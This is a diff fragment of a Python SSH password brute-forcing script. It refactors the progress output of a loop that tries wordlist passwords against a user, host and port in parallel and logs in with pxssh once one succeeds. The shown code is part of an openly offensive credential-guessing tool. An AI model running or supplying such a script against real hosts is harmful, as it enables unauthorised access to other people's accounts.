@@ -74,32 +74,33 @@ if __name__ == '__main__':
     pws, lenpws = load_pws(wordlist)
 
     clock_start = time.time()
-    pool = multiprocessing.Pool(multiprocessing.cpu_count() * NUM_WORKERS_PER_CPU)
+    nw = multiprocessing.cpu_count() * NUM_WORKERS_PER_CPU
+    pool = multiprocessing.Pool(nw)
 
     results = []
     for pw in pws:
         args = (user, host, port, pw)
         results.append(pool.apply_async(connect, args))
 
-    password = None
-    i = 0
     w = len(str(lenpws))
-    for result in results:
+    password = None
+    for i, result in enumerate(results, 1):
         res, pw = result.get()
-        i += 1
+        progress = f"({i:0>{w}}/{lenpws}; {(i/lenpws)*100:0>5.2f}%)"
         if res:
             password = pw
-            print(f"({i:0>{w}}/{lenpws}; {(i/lenpws)*100:0>5.2f}%) Password == '{pw}'")
+            print(f"{progress} Password == '{pw}'")
             pool.terminate()
             break
         else:
-            print(f"({i:0>{w}}/{lenpws}; {(i/lenpws)*100:0>5.2f}%) Password != '{pw}'")
+            print(f"{progress} Password != '{pw}'")
 
     clock_end = time.time()
     pool.close()
 
     td = clock_end - clock_start
-    print(f"Took {td/60:.2f} minutes to check {i}/{len(pws)} passwords at a rate of {i/td:.2f}pw/s.")
+    print(f"Took {td/60:.2f} minutes to check {i}/{len(pws)} "
+          f"passwords at a rate of {i/td:.2f}pw/s.")
 
     if password:
         ssh = pxssh.pxssh()
